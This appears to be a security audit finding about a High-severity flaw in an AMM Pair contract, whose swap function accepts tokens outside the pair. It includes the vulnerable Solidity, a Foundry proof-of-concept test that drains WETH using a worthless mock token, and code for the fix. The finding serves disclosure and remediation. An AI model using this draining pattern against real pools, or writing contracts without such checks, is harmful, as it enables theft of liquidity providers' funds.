### [H-1] Missing token validation in swap function allows unauthorized token withdrawals

**Severity:** High

**Description:**
The `swap` function in the Pair contract does not validate that the `fromToken` and `targetToken` addresses match either `token0` or `token1`. When a user calls `swap` with an invalid `fromToken` that doesn't match either of the pair's tokens, they can effectively withdraw tokens from the pair without actually providing any valid tokens in return.

This happens because:

1. The `_getReserveFromToken` function returns 0 for any token that doesn't match token0 or token1
2. The `getAmountOut` function calculates a non-zero output based on the existing pool reserves
3. The contract then transfers the output token to the attacker while accepting a worthless or non-existent token

```solidity
function swap(address fromToken, address targetToken, uint256 amountIn) external lock {
    // No validation that fromToken and targetToken are valid pair tokens
    uint256 amountOut = getAmountOut(fromToken, targetToken, amountIn);

    if (amountOut == 0) revert Pair_InsufficientOutput();

    // First transfer FROM user TO pair - accepts any token address!
    IERC20(fromToken).safeTransferFrom(msg.sender, address(this), amountIn);
    // Then transfer FROM pair TO user - sends real tokens from the pool
    IERC20(targetToken).safeTransfer(msg.sender, amountOut);

    // ...
}

function _getReserveFromToken(address token) internal view returns (uint256 reserve) {
    if (token == token0) {
        return reserve0;
    } else if (token == token1) {
        return reserve1;
    }
    // No else condition, implicitly returns 0 for invalid tokens
}
```

**Impact:**
This is a critical vulnerability that allows an attacker to drain tokens from the pool:

- Attackers can withdraw any amount of token0 or token1 from the pool by providing a worthless token that isn't part of the pair
- The attacker can create their own ERC20 token with no value and use it to drain the entire liquidity pool
- Liquidity providers will lose their funds as the pool can be completely drained
- The core invariant of the AMM (constant product formula) is completely broken as the contract accepts tokens that aren't accounted for in the reserves

**Severity Justification:**

- **Impact:** High - Direct theft of funds from the protocol is possible
- **Likelihood:** High - The attack is straightforward to execute and requires minimal setup
- **Rating:** High - This is a critical vulnerability that allows unauthorized token withdrawal and can lead to complete pool drainage

**Proof of Concept:**
The following test demonstrates how an attacker can drain tokens from the pool by providing a worthless token:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { Test } from "@forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { Constants } from "../helpers/Constants.sol";
import { Pair } from "../../contracts/Pair.sol";

contract PairH1Test is Test, Constants {
    function setUp() public {
        usdc = address(new ERC20Mock());
        weth = address(new ERC20Mock());
        pair = new Pair(usdc, weth);

        deal(usdc, USER_1, TOKEN_0_AMOUNT);
        deal(weth, USER_1, TOKEN_1_AMOUNT);

        vm.startPrank(USER_1);
        IERC20(usdc).approve(address(pair), TOKEN_0_AMOUNT);
        IERC20(weth).approve(address(pair), TOKEN_1_AMOUNT);
        pair.addLiquidity(TOKEN_0_AMOUNT, TOKEN_1_AMOUNT);
        vm.stopPrank();
    }

    function test_InvalidToken_DoNotRevert_() public {
        // Arrange attack
        address ATTACKER = makeAddr("ATTACKER");
        address invalidToken = address(new ERC20Mock());
        deal(invalidToken, ATTACKER, TOKEN_1_AMOUNT);
        vm.prank(ATTACKER);
        IERC20(invalidToken).approve(address(pair), TOKEN_1_AMOUNT);

        uint256 attackerWethPreBalance = IERC20(weth).balanceOf(ATTACKER);
        assertEq(attackerWethPreBalance, 0);

        uint256 expectedWethReceived = pair.getAmountOut(invalidToken, weth, TOKEN_1_AMOUNT);

        // Try to swap an invalid token
        vm.prank(ATTACKER);
        // vm.expectRevert(); // This should revert but doesn't
        pair.swap(invalidToken, weth, TOKEN_1_AMOUNT);

        uint256 attackerWethPostBalance = IERC20(weth).balanceOf(ATTACKER);
        assertEq(attackerWethPostBalance, expectedWethReceived);
    }
}
```

**Recommended Mitigation:**
Implement strict token validation in both the `swap` and `getAmountOut` functions:

```solidity
function swap(address fromToken, address targetToken, uint256 amountIn) external lock {
    // Validate token addresses
    if (fromToken != token0 && fromToken != token1) {
        revert Pair_InvalidInputToken();
    }

    if (targetToken != token0 && targetToken != token1) {
        revert Pair_InvalidOutputToken();
    }

    if (fromToken == targetToken) {
        revert Pair_IdenticalTokens();
    }

    uint256 amountOut = getAmountOut(fromToken, targetToken, amountIn);
    // ...
}
```

Apply the same validation in the `getAmountOut` function:

```solidity
function getAmountOut(address fromToken, address targetToken, uint256 amountIn)
    public
    view
    returns (uint256 amountOut)
{
    // Validate token addresses
    if (fromToken != token0 && fromToken != token1) {
        revert Pair_InvalidInputToken();
    }

    if (targetToken != token0 && targetToken != token1) {
        revert Pair_InvalidOutputToken();
    }

    if (fromToken == targetToken) {
        revert Pair_IdenticalTokens();
    }

    if (amountIn == 0) {
        revert Pair_InsufficientInput();
    }

    uint256 reserveIn = _getReserveFromToken(fromToken);
    uint256 reserveOut = _getReserveFromToken(targetToken);

    // Continue with calculation...
}
```

Additionally, consider adding validation in the `_getReserveFromToken` function to explicitly revert for invalid tokens:

```solidity
function _getReserveFromToken(address token) internal view returns (uint256 reserve) {
    if (token == token0) {
        return reserve0;
    } else if (token == token1) {
        return reserve1;
    } else {
        revert Pair_InvalidToken();
    }
}
```
